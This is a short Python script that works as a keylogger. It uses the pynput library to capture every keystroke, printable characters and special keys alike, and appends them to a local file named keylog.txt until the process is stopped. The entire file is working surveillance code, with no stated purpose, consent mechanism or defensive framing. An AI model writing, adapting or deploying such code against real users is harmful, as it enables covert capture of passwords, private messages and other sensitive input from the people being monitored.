from pynput import keyboard
import os
import time

file = open('keylog.txt', 'a')
file.write('Start keylogging\n')
file.close()

def on_press(key):
    file = open('keylog.txt', 'a')
    try:
        key = key.char
        #print(f'alphanumeric key {key} pressed')
        file.write(f"{key}")
        
    except AttributeError:
        #print(f'special key {key} pressed')
        file.write(f"{str(key)}")
    file.close()
        
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
   
